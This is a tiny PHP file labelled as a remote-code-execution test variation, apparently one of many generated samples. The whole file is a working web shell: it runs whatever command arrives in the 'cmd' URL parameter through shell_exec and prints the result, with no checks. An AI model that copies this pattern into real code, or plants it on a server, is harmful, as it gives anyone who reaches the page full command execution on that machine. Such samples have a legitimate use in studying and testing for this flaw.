<?php
// RCE test variation #1374
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>